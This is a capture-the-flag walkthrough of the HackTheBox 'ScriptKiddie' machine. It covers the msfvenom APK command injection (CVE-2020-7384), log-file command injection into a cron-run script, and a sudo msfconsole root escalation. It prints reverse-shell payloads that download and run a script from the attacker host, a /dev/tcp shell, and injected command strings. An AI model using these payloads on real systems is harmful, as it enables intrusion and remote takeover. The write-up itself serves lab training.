---
Category:
  - B2R
Difficulty: Easy
Platform: HackTheBox
Status: 3. Complete
tags: [command-injection, insecure-file-permissions, privesc/msfconsole, Linux]
---
## Introduction

>[!summary]
**ScriptKiddie** is an easy difficulty Linux box based on** known vulnerabilities for traditional hacking tools**. The target machine ran a custom web application that interacted with different tools, one of which vulnerable to** APK template command injection**. Exploiting the issue it was possible to obtain a reverse shell and get a foothold on the target. Local enumeration allowed to find a** custom script** ran with user privileges, also **vulnerable to command injection**, which provided user access to the box. `pwn` was allowed to execute **msfconsole with high privileges** using `sudo`, allowing to spawn a high privileged shell

### Improved skills

- Command Injection attacks
- Code review

### Used tools

- nmap
- netcat

---

## Enumeration

Scanned all tcp ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/ScriptKiddie]
└─$ sudo nmap 10.10.10.226 -oN scans/all-ports.txt -sS -p- -v
...
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  http
```

Enumerated all open ports:

```bash
┌──(kali㉿kali)-[~/CTFs/HTB/box/ScriptKiddie]
└─$ sudo nmap 10.10.10.226 -oN scans/open-ports.txt -sT -sC -sV -Pn -p22,5000
...
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.33 seconds
```

Nmap discovered two services running on the target: an ssh service on port 22 revealing the exact build version of openssh and a python web server running on a non traditional port.

![Pasted image 20210421103447.png](../../zzz_res/attachments/Pasted_image_20210421103447.png)

It was searched for known exploit targeting Werkzeug: 

![Pasted image 20210421104830.png](../../zzz_res/attachments/Pasted_image_20210421104830.png)

However for the current target the *debug shell* was not enabled.

Current web application **features depended** on different **external tools** (nmap, msfvenom and searchsploit), one of which vulnerable to **APK template command injection**. 

![Pasted image 20210421122525.png](../../zzz_res/attachments/Pasted_image_20210421122525.png)

## Foothold

The version of msfvenom used by the web application was vulnerable to **APK template command injection** (CVE-2020-7384). Metasploit msfvenom framework handles APK files in a way that **allows for a malicious user to craft and publish a file that would execute arbitrary commands** on a victim’s machine.

Because the web site **allowed to upload different files used as template by msfvenom**, this was a solid path to follow (since no msfvenom version was obtained earlier).

The PoC used to craft the malicious APK was the following: [Offensive Security's Exploit Database Archive](https://www.exploit-db.com/exploits/49491)

The payload was then changed to **download and execute a reverse shell** on the victim machine:

```python
...
# Change me
payload = 'wget -O - 10.10.14.14/revshell.sh | bash'
...
```

Second stage payload downloaded and executed by the initial one:

```bash
bash -i >& /dev/tcp/10.10.14.14/443 0>&1
```

Generated the malicious apk file and hosted the second stage payload:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/ScriptKiddie/exploit]
└─$ python3 49491.py
[+] Manufacturing evil apkfile
Payload: wget -O - 10.10.14.14/revshell.sh | bash
-dname: CN='|echo d2dldCAtTyAtIDEwLjEwLjE0LjE0L3JldnNoZWxsLnNoIHwgYmFzaA== | base64 -d | sh #

  adding: empty (stored 0%)
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
jar signed.

Warning:
The signer's certificate is self-signed.
The SHA1 algorithm specified for the -digestalg option is considered a security risk. This algorithm will be disabled in a future update.
The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk. This algorithm will be disabled in a future update.
POSIX file permission and/or symlink attributes detected. These attributes are ignored when signing and are not protected by the signature.

[+] Done! apkfile is at /tmp/tmps70hg8mz/evil.apk
Do: msfvenom -x /tmp/tmps70hg8mz/evil.apk -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null

┌──(kali㉿kali)-[~/…/HTB/box/ScriptKiddie/exploit]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Uploaded the malicious apk to the application and obtained a reverse shell: 

![Pasted image 20210421132429.png](../../zzz_res/attachments/Pasted_image_20210421132429.png)

```bash
┌──(kali㉿kali)-[~/…/HTB/box/ScriptKiddie/exploit]
└─$ sudo nc -nlvp 443                                                        
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.226] 56612
bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ whoami
whoami
kid
kid@scriptkiddie:~/html$ hostname
hostname
scriptkiddie
kid@scriptkiddie:~/html$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
kid@scriptkiddie:~/html$ ^Z
zsh: suspended  sudo nc -nlvp 443

┌──(kali㉿kali)-[~/…/HTB/box/ScriptKiddie/exploit]
└─$ stty raw -echo; fg
[1]  + continued  sudo nc -nlvp 443

kid@scriptkiddie:~/html$ export TERM=xterm
kid@scriptkiddie:~/html$ stty rows 60 columns 235
```

## Lateral Movement to pwn

Observing the running processes and local enumerating the box it was possible to discover a **bash script vulnerable to code injection** ran by the `pwn` user:

```bash
kid@scriptkiddie:~/html$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash

kid@scriptkiddie:/var/www$ id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
2021/04/21 12:51:12 CMD: UID=1001 PID=64051  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:12 CMD: UID=1001 PID=64055  | 
2021/04/21 12:51:12 CMD: UID=1001 PID=64054  | 
2021/04/21 12:51:12 CMD: UID=1001 PID=64059  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:12 CMD: UID=1001 PID=64058  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:12 CMD: UID=1001 PID=64057  | nmap --top-ports 10 -oN recon/10.10.14.14.nmap 10.10.14.14 
2021/04/21 12:51:12 CMD: UID=1001 PID=64056  | sh -c nmap --top-ports 10 -oN recon/10.10.14.14.nmap 10.10.14.14 2>&1 >/dev/null 
2021/04/21 12:51:13 CMD: UID=1001 PID=64064  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:13 CMD: UID=1001 PID=64063  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:13 CMD: UID=1001 PID=64062  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:13 CMD: UID=1001 PID=64061  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:13 CMD: UID=1001 PID=64060  | /bin/bash /home/pwn/scanlosers.sh 
2021/04/21 12:51:14 CMD: UID=0    PID=64067  | /usr/sbin/incrond 
2021/04/21 12:52:01 CMD: UID=0    PID=64081  | /bin/sh -c find /home/kid/html/static/payloads/ -type f -mmin +5 -delete 
2021/04/21 12:52:01 CMD: UID=0    PID=64080  | /usr/sbin/CRON -f
...
2021/04/21 12:56:57 CMD: UID=1001 PID=64210  | /bin/bash -c sed -i 's/open  /closed/g' "/home/pwn/recon/10.10.14.14.nmap"
```

The `scanlosers.sh` script ran every time a hack was detected. It **read data from a writable log file** owned by `kid` (current user) and **used them** to build an `nmap` command:

```bash
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

A `ping` command was used as payload and was **injected inside the log** file to verify the vulnerability:

```bash
kid@scriptkiddie:~/logs$ echo '0 0 $(ping -c1 10.10.14.14)' > hackers
```

```bash
┌──(kali㉿kali)-[~/…/box/ScriptKiddie/loot/pwn_script]
└─$ sudo tcpdump icmp -i tun0
[sudo] password for kali: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:20:06.879068 IP 10.10.10.226 > 10.10.14.14: ICMP echo request, id 5, seq 1, length 64
12:20:06.879098 IP 10.10.14.14 > 10.10.10.226: ICMP echo reply, id 5, seq 1, length 64
12:20:06.930982 IP 10.10.10.226 > 10.10.14.14: ICMP echo request, id 6, seq 1, length 64
12:20:06.931030 IP 10.10.14.14 > 10.10.10.226: ICMP echo reply, id 6, seq 1, length 64
```

Proved that it was possible to execute code, a two-stage reverse shell payload was then used.

Served the same reverse shell used during the foothold:

```bash
┌──(kali㉿kali)-[~/…/HTB/box/ScriptKiddie/exploit]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Injected the staged command within the log:

```bash
kid@scriptkiddie:~/logs$ echo '0 0 $(curl 10.10.14.14/revshell.sh | bash )' > hackers
```

Obtained the reverse shell:

```bash
┌──(kali㉿kali)-[~/…/box/ScriptKiddie/loot/pwn_script]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.226] 56974
bash: cannot set terminal process group (856): Inappropriate ioctl for device
bash: no job control in this shell
pwn@scriptkiddie:~$ whoami
whoami
pwn
pwn@scriptkiddie:~$
```

## Privilege Escalation

Enumerated sudo privileges of the `pwn` user:

```bash
pwn@scriptkiddie:~$ sudo -l
Matching Defaults entries for pwn on scriptkiddie:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User pwn may run the following commands on scriptkiddie:
    (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Because the `pwn` user was able to execute the `msfconsole` tool with high privileges and the tool itself offered a builtin function to spawn a shell, it was possible to leverage this feature to obtain a full interactive root shell:

```bash
pwn@scriptkiddie:~$ sudo /opt/metasploit-framework-6.0.9/msfconsole -q
msf6 > bash
[*] exec: bash

root@scriptkiddie:/home/pwn# whoami && hostname && cat /root/root.txt && ifconfig -a
root
scriptkiddie
db90201a61bd45b56fe74fb7a44253ee
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.226  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:a9c3  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:feb9:a9c3  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:b9:a9:c3  txqueuelen 1000  (Ethernet)
        RX packets 31355  bytes 6228551 (6.2 MB)
        RX errors 0  dropped 59  overruns 0  frame 0
        TX packets 20962  bytes 24340256 (24.3 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 53480  bytes 3798372 (3.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 53480  bytes 3798372 (3.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

![Pasted image 20210421184741.png](../../zzz_res/attachments/Pasted_image_20210421184741.png)

# Trophy

>[!quote]
>A hacker does for love what others would not do for money
>
\- Laura Creighton 

>[!success]
>**User.txt**
>d39801357eae303d1053964e21274317

>[!success]
>**Root.txt**
>db90201a61bd45b56fe74fb7a44253ee